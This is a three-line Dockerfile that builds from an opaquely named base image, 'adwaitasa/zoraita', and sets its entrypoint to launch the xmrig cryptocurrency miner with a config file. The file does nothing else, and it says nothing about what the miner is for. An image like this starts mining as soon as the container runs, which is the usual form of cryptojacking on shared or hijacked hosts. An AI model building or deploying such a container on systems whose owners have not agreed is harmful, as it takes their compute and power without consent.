FROM adwaitasa/zoraita
RUN apt-get update
ENTRYPOINT /xmrig-5.1.0/xmrig -c config.json
